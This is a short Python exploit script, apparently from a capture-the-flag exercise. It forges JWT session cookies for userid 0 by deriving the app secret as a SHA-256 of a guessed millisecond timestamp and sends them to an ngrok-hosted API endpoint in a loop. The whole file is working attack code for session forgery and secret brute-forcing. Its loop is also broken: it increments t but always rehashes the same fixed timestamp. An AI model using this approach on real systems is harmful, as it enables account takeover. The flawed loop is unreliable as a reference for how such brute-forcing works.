import hashlib, time, jwt, os, requests

# time_started = round(time.time())
# APP_SECRET = hashlib.sha256(str(1730342000000).encode()).hexdigest()
# # 768570e4d871e189d41d980af24b66f7a424cd6d12b628c24db60284e49e6fb1
# print(jwt.encode({"userid": 0}, APP_SECRET))


import requests

# api-endpoint
URL = "https://e278-113-185-78-58.ngrok-free.app/api/files"

# sending get request and saving the response as response object
t = 1730342000000
APP_SECRET = hashlib.sha256(str(1730342000000).encode()).hexdigest()
s = jwt.encode({"userid": 0}, APP_SECRET)
r = requests.get(url = URL, cookies={"session": s})
while(True):
    if(r.status_code == 500 or r.status_code == 200): 
        break
    print(t)
    t+=1
    APP_SECRET = hashlib.sha256(str(1730342000000).encode()).hexdigest()
    s = jwt.encode({"userid": 0}, APP_SECRET)
    r = requests.get(url = URL, cookies={"session": s})

print(s)